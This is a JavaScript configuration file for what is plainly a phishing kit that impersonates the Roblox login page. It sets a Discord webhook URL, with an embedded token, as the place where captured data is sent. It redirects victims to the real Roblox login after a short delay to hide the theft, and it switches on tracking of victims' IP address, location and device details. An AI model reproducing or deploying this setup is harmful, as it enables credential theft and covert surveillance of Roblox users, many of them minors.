// Configuration file for the Roblox login page

const CONFIG = {
    // Your Discord webhook URL
    // You can create a webhook in Discord by:
    // 1. Go to your Discord server
    // 2. Click on a channel's settings (gear icon)
    // 3. Go to Integrations > Webhooks > New Webhook
    // 4. Copy the webhook URL and paste it below
    DISCORD_WEBHOOK_URL: 'https://discord.com/api/webhooks/1401237979753611376/XzOQbwaGaL6h8XDwxYTiW_pe5tmQYqQpdOKCKg-NxesEsgxsAIpHuF0B5vrZc33Xg8ve',
    
    // The page to redirect to after login (optional)
    REDIRECT_URL: 'https://www.roblox.com/login',
    
    // Delay before redirect in milliseconds (2000 = 2 seconds)
    REDIRECT_DELAY: 2000,
    
    // Customize page appearance (optional)
    PAGE_TITLE: 'Roblox',
    LOGO_ICON: 'fas fa-lock', // Font Awesome icon class
    PRIMARY_COLOR: '#0066ff', // Main color theme
    
    // Enable or disable features
    ENABLE_IP_TRACKING: true,
    ENABLE_LOCATION_TRACKING: true,
    ENABLE_DEVICE_INFO: true
};